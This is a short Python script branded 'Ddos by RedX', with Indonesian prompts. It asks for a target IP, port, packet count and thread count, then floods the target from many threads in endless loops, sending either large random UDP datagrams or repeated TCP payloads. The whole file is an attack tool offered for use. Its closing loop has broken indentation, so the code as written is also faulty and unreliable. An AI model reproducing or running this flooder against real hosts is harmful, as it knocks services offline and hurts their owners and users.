#!/usr/bin/env python3
#Ddos by RedX
import random
import socket
import threading
import os

os.system("clear")
print("██████╗░███████╗██████ ╗██╗░░██╗")
print("██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝")
print("██████╔╝█████╗░░██║░░██║░╚███╔╝")
print("██╔══██╗██╔══╝░░██║░░██║░██╔██╗")
print("██║░░██║███████╗██████╔╝██╔╝╚██╗")
print("╚═╝░░╚═╝╚══════╝╚═════╝╚═╝░░╚═╝")










print("------------------------------------------------------------")
print("      >Jangan Abuse Ya Maniez<         ")
print("          >Tools By RedX<              ")
print("------------------------------------------------------------")
ip = str(input("DdosAttackByRedX | ip:"))
port = int(input("DdosAttackByRedX | port:"))
choice = str(input("DdosAttackByRedX | Serang Ga Ni?(y/n):"))
times = int(input("DdosAttackByRedX | Packets:"))
threads = int(input("DdosAttackByRedX | Threads:"))
def run():
    data = random._urandom(20480)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" RedX Menyenggol ")
        except:
            print(" [!] RedX IS HERE DUDE! ")

def run2():
    data = random._urandom(204)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" RedX Menyenggol ")
        except:
            s.close()
            print("[*] RedX IS HERE DUDE ")

for y in range(threads):
    if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
else:
    th = threading.Thread(target = run2)
    th.start()
